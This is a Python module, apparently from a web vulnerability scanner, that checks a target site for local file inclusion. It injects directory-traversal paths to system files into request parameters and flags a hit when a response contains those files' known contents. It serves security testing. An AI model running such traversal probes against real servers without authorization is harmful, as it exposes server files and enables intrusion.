import asyncio
import json
from urllib.parse import urljoin

import aiohttp

from utils import unique_not_none
from vulns import Vuln

with open("data/payloads/lfi.json") as f:
    PAYLOADS = json.load(f)


class LFI(Vuln):

    async def check_lfi(self, session: aiohttp.ClientSession, args, method, path, params, param, payload, content):
        try:
            params_kwargs = {"params": params} if method == "get" else {"data": params}

            async with session.request(method, urljoin(args.url, path), **params_kwargs) as response:
                text = await response.text()
                if any(s in text for s in content):
                    return f"LFI: {method.upper()} {path} with parameter {param}"
        except:
            pass

    def get_file_paths(self, args):
        for os in PAYLOADS:
            for parent, sep in PAYLOADS[os]["separators"]:
                for file in PAYLOADS[os]["files"]:
                    for d in range(1, args.lfi_depth + 1):
                        path = (parent + sep) * d + sep.join(file["path"])
                        yield path, file["content"]

    async def run(self, session: aiohttp.ClientSession, args, dirs):
        tasks = []
        payloads = list(self.get_file_paths(args))

        for file_path, content in payloads:
            for method, path, params, param, _ in self.get_requests(dirs, [""]):
                params[param] = file_path
                tasks.append(self.check_lfi(session, args, method, path, params, param, file_path, content))

        results = await asyncio.gather(*tasks)
        return unique_not_none(results)
